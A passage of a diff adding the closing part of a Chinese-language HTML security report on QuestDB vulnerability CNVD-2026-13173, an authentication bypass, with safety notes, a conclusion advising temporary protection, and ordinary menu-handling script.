+                        <p class="text-gray-600 text-sm">厂商尚未提供漏洞修复方案，请关注厂商主页更新：<a href="https://questdb.com/" class="text-blue-600 hover:underline" target="_blank">https://questdb.com/</a></p>
+                    </div>
+                </div>
+                <div class="flex items-start">
+                    <div class="w-8 h-8 bg-blue-600 text-white rounded-lg flex items-center justify-center mr-4 shrink-0 mt-1">3</div>
+                    <div>
+                        <h4 class="font-bold text-gray-800">安全注意事项</h4>
+                        <ul class="list-disc list-inside space-y-1 text-gray-600 text-sm">
+                            <li>合法使用：本工具仅用于授权安全测试，禁止用于非法攻击</li>
+                            <li>权限要求：确保对目标主机有明确的测试授权</li>
+                            <li>网络连接：确保网络连通性</li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- Section 6: Conclusion -->
+        <footer id="conclusion" class="text-center py-12 bg-gray-900 text-white rounded-3xl overflow-hidden relative">
+            <div class="absolute inset-0 opacity-10 bg-[url('https://www.transparenttextures.com/patterns/carbon-fibre.png')]"></div>
+            <div class="relative z-10 px-8">
+                <h2 class="text-3xl font-bold mb-6">结论</h2>
+                <p class="max-w-4xl mx-auto text-gray-400 leading-relaxed mb-8">
+                    本报告详细分析了 CNVD-2026-13173 漏洞，该漏洞导致 QuestDB 数据库存在未授权访问风险。攻击者可以利用此漏洞绕过身份验证机制，获取敏感信息。建议相关组织立即采取临时防护措施，并密切关注厂商的修复方案。同时，我们强调安全测试工具的合法使用原则，严禁用于未授权的攻击行为。
+                </p>
+                <div class="border-t border-gray-800 pt-8">
+                    <p class="text-sm text-gray-500">© 2026 哪吒网络安全 - 怀赤诚之心，筑数据屏障</p>
+                </div>
+            </div>
+        </footer>
+    </main>
+
+    <!-- Scripts -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.24.1/prism.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.24.1/components/prism-bash.min.js"></script>
+    
+    <script>
+        // Mobile menu toggle
+        const btn = document.getElementById('mobile-menu-button');
+        const menu = document.getElementById('mobile-menu');
+        
+        btn.addEventListener('click', (e) => {
+            e.stopPropagation();
+            menu.classList.toggle('hidden');
+        });
+
+        // Close menu on click outside
+        document.addEventListener('click', (e) => {
+            if (!menu.contains(e.target) && !btn.contains(e.target)) {
+                menu.classList.add('hidden');
+            }
+        });
+
+        // Close menu on navigation
+        menu.querySelectorAll('a').forEach(link => {
+            link.addEventListener('click', () => menu.classList.add('hidden'));
+        });
+
+        // Active link highlighting
+        const sections = document.querySelectorAll('section, header, footer');
+        const navLinks = document.querySelectorAll('.nav-link');
+
+        window.addEventListener('scroll', () => {
+            let current = '';
+            sections.forEach(section => {
+                const sectionTop = section.offsetTop;
+                if (pageYOffset >= sectionTop - 150) {
+                    current = section.getAttribute('id');
+                }
+            });
+
+            navLinks.forEach(link => {
+                link.classList.remove('text-blue-600');
+                if (link.getAttribute('href').substring(1) === current) {
+                    link.classList.add('text-blue-600');
+                }
+            });
+        });
+    </script>
+</body>
+</html>
